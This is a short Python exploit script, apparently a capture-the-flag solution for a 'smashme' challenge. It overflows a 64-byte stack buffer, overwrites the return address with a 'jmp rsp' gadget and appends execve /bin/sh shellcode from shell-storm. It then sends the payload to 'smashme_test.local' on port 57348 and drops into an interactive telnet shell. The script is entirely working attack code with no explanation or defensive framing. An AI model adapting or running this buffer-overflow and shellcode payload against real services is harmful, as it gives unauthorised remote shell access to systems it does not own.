import socket
import struct
import telnetlib

smash_me = 'Smash me outside, how bout dAAAAAAAAAAAA'
buf_size = 64 + 8
ret_addr = 0x0045f782 # jmp rsp



# http://shell-storm.org/shellcode/files/shellcode-806.php
shellcode = '\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'

# \xd1\x9d\x96\x91\xd0\x8c\x97\xff = 0xFF978CD091969DD1


buf = smash_me
buf += 'A' * (buf_size - len(smash_me))
buf += struct.pack('<Q', ret_addr)
buf += shellcode

print('len', len(smash_me))
print('buf', buf)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('smashme_test.local', 57348))
s.sendall(buf)

t = telnetlib.Telnet()
t.sock = s
t.interact()
